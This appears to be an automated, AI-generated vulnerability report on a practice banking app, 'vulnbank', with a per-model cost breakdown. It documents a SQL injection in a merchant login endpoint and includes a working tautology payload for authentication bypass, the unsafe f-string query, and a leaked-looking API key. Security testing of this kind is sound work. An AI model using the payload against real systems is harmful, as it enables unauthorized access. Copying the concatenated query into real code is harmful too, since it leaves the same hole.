# Vulnerability Research Report
**Target:** vulnbank
**Date:** 2026-05-18 05:16 UTC
**Confirmed Findings:** 1

---

## Findings

### [HIGH] SQL injection - POST /api/v1/merchants/login and POST /api/v1/merchants/register in merchant_payments.py
**Confirmed:** Yes
**Proof of Concept:**

```
1) Send a SQLi payload in the merchant login email field: POST https://vulnbank.org/api/v1/merchants/login with JSON body {"email":"' OR '1'='1' -- ","password":"x"}
2) The endpoint returns HTTP 200 and authenticates as an existing merchant despite invalid credentials.
3) Confirmed response includes a valid token and merchant data, e.g. merchant id 5, api_key vk_9da8780a381915da91ad2693249937745283266704661097a162c48c38976205.
4) The same bypass is reproducible in /api/v1/merchants/login with other tautologies because the query is string-concatenated without parameterization.
```

**Evidence:**

```
Source review shows unsafe f-string SQL in merchant_payments.py: `WHERE email = '{email}' AND password = '{password}'`. Live testing confirmed the issue: `POST /api/v1/merchants/login` with `email=' OR '1'='1' -- ` returned 200 OK and a valid JWT/api_key for an existing merchant. A second live request using a tautology on the same endpoint reproduced the bypass. This is a confirmed, reproducible SQL injection leading to authentication bypass and sensitive data disclosure.
```

## Cost Summary

**Total Cost:** $0.0658
**Cost per Confirmed Finding:** $0.0658
**Total Tokens:** 429397
**Input Tokens:** 426289
**Output Tokens:** 3108

## Cost Breakdown

### By Model
- gpt-5.4-mini: $0.0658

### By Scanner Swarm
- vulnbank/auth/gpt-5.4-mini: $0.0222
- vulnbank/source/gpt-5.4-mini: $0.0099
- vulnbank/sqli/gpt-5.4-mini: $0.0088
- vulnbank/xss/gpt-5.4-mini: $0.0249